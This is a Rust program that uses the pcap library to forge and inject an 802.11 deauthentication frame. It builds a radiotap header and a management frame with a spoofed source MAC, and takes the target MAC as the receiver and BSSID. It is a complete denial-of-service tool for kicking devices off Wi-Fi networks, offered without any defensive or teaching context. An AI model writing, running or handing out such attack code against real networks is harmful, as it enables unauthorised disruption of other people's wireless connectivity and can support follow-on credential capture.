use std::env::args;
use pcap::{ Capture, Device };

fn parse_mac(mac: &String) -> Option<Vec<u8>> {
    let mac_vec: Vec<u8> = mac.split(':')
                                .map(|x| u8::from_str_radix(x, 16).unwrap())
                                .collect();
    if mac_vec.len() != 6 {
        return None;
    }

    return Some(mac_vec);
}

fn main() {
    let argv: Vec<String> = args().collect();
    if argv.len() < 3 {
        println!("[?] Usage: {} <source_mac> <target_mac>", argv[0]);
    }
    
    let source_mac = match parse_mac(&argv[1]) {
        Some(x) => x,
        None => panic!("[!] Not a valid source mac address"),
    };
    let target_mac = match parse_mac(&argv[2]) {
        Some(x) => x,
        None => panic!("[!] Not a valid destination mac address"),
    };

    let radiotap_headers = [
        0x00, 0x00,                 // radiotap version + 0x00 padding
        0x19, 0x00,                 // number of bytes in our header (length)
        0x6f, 0x08, 0x00, 0x00,     // fields present (extensions)
        0x11, 0x13, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC timestamp
        0x10,                       // short guard interval
        0x02,                       // data rate
        0x6c, 0x09,                 // channel frequency
        0x80, 0x04,                 // channel flags (here: 2GHz spectrum & Dynamic CCK-OFDM)
        0xed, 0xa9, 0x00,           // (antenna signal, antenna noise, antenna)
    ];

    let mac_headers = [
        0xc0, 0x00,                 // frame control
        0x00, 0x00,                 // duration
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // reciever
        source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5], // sender
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // bssid (reciever)
        0x00, 0x00,                 // sequence control
        0x07, 0x00,                 // reason code
    ];
    
    let mut packet: Vec<u8> = Vec::new();
    packet.extend_from_slice(&radiotap_headers);
    packet.extend_from_slice(&mac_headers);
    
    let mut capture = Capture::from_device(Device::lookup().unwrap().unwrap())
                            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
                            .open()
                            .unwrap();
    
    match capture.sendpacket(packet) {
        Ok(_) => {},
        Err(err) => println!("[!] Error sending packet {} !", err),
    }
}
